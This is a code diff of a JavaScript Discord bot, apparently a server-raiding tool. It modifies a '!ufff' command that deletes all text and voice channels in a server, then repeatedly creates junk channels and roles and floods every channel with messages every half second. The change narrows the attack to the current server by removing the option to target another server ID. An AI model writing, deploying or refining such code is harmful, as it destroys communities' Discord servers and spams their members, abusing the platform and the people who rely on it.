@@ -28,40 +28,32 @@ client.on("messageCreate",function(message){
     return;
   }
   if(message.content.indexOf("!ufff")!=-1){
-    let serverID=message.content.split("!ufff ")[1]||message.guild.id;
     message.delete();
-    if(serverID){
-      let guild=client.guilds.cache.get(serverID);
-      guild.channels.cache.forEach(function(channel){
-        if(channel.type==0||channel.type==2){
-          channel.delete();
+    let guild=client.guilds.cache.get(message.guild.id);
+    guild.channels.cache.forEach(function(channel){
+      if(channel.type==0||channel.type==2){
+        channel.delete();
+      }
+    });
+    setInterval(async function(){
+      guild.channels.cache.forEach(function(channel,i){
+        if(channel.type==4){
+          setTimeout(function(){
+            guild.channels.create({
+              name:getText(true),
+              type:0,
+              parent:channel.id
+            });
+          },100*i);
+        }
+        if(channel.type==0){
+          setTimeout(async function(){
+            await channel.send(getText());
+          },100*i);
         }
       });
-      setInterval(async function(){
-        guild.channels.cache.forEach(function(channel,i){
-          if(channel.type==4){
-            setTimeout(function(){
-              guild.channels.create({
-                name:getText(true),
-                type:0,
-                parent:channel.id
-              });
-            },100*i);
-          }
-          if(channel.type==0){
-            setTimeout(async function(){
-              await channel.send(getText());
-            },100*i);
-          }
-        });
-        await guild.roles.create({name:getText(true)});
-      },500);
-   }
-    else{
-      setInterval(function(){
-        message.channel.send(getText());
-      },500);
-    }
+      await guild.roles.create({name:getText(true)});
+    },500);
   }
 });
 client.on("interactionCreate",async function(e){
